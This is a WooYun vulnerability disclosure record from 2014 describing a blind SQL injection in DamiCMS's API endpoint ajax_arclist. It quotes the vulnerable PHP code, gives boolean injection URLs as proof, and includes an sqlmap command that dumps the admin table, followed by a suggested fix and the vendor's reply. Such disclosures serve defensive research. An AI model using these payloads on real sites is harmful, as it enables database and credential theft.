{"id": 43831, "wybug_id": "wooyun-2014-081519", "wybug_title": "大米CMS某处SQL盲注2", "wybug_corp": "damicms.com", "wybug_author": "xfkxfk", "wybug_date": "2014-11-01 15:32", "wybug_open_date": "2015-01-30 15:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-30：\t细节向公众公开  简要描述： 大米CMS某处SQL盲注第二发，可直接拖库 详细说明：  文件/Web/Lib/Action/ApiAction.class.php\n//万能获取数据接口function ajax_arclist(){$prefix = !empty($_REQUEST['prefix'])?(bool)$_REQUEST['prefix']:true;\t\t //表过滤防止泄露信息,只允许的表\t\t if(!in_array($_REQUEST['model'],array('article','type','ad','label','link'))){exit();}\t\t if(!empty($_REQUEST['model'])){\t\t if($prefix == true){\t\t $model = C('DB_PREFIX').$_REQUEST['model'];\t\t }\t\t else{\t\t$model =\t$_REQUEST['model'];\t\t } \t\t }else{\t\t$model = C('DB_PREFIX').'article';\t\t }           $order     =!empty($_REQUEST['order'])?$_REQUEST['order']:'';         $num       =!empty($_REQUEST['num'])?$_REQUEST['num']:'';         $where     =!empty($_REQUEST['where'])?urldecode($_REQUEST['where']):'';         //使where支持 条件判断,添加不等于的判断         $page=false;         echo $_REQUEST['page'];         if(!empty($_REQUEST['page'])) $page=(bool)$_REQUEST['page'];             $pagesize  =!empty($_REQUEST['pagesize'])?$_REQUEST['pagesize']:'10';         //$query     =!empty($_REQUEST['sql'])?$_REQUEST['sql']:'';//太危险不用         $field     =!empty($_REQUEST['field'])?$_REQUEST['field']:'';\t         $m=new Model($model,\"\",false);\t          //如果使用了分页,缓存也不生效         if($page){               import(\"@.ORG.Page\");     //这里改成你的Page类                         $count=$m->where($where)->count();              $total_page = ceil($count / $pagesize);              $p = new Page($count,$pagesize);               //如果使用了分页，num将不起作用               $t=$m->field($field)->where($where)->limit($p->firstRow.','.$p->listRows)->order($order)->select();\t\t\t   //echo $m->getLastSql();\t\t\t   \t\t\t   $ret = array('total_page'=>$total_page,'data'=>$t);\t\t\t            }         //如果没有使用分页，并且没有 query         if(!$page){             $ret=$m->field($field)->where($where)->order($order)->limit($num)->select();         }\t\t          $this->ajaxReturn($ret,'返回信息',1);\t\t }\n当满足这个条件时：\nin_array($_REQUEST['model'],array('article','type','ad','label','link'))\nwhere就被赋值了\n$where     =!empty($_REQUEST['where'])?urldecode($_REQUEST['where']):'';\n然后将where就带入SQL语句\n$count=$m->where($where)->count();\n导致SQL注入   漏洞证明：  标准的盲注：\nhttp://localhost/dami/index.php?s=/api/ajax_arclist/model/article/where/123 and 1=1\n\n\n\nhttp://localhost/dami/index.php?s=/api/ajax_arclist/model/article/where/123 and 1=2\n\n\n用SQLmap跑一下数据：\npython sqlmap.py -u \"http://10.65.20.198/dami/index.php?s=/api/ajax_arclist/model/article/where/123*\" -D \"dami\" -T \"dami_admin\" --dump -v 3\n管理员账户信息：\n\n   修复方案：  intval($_REQUEST['where'])   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-11-01 17:21 厂商回复： 大米团队自身也发现了这漏洞3.9己修正，但还是很感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}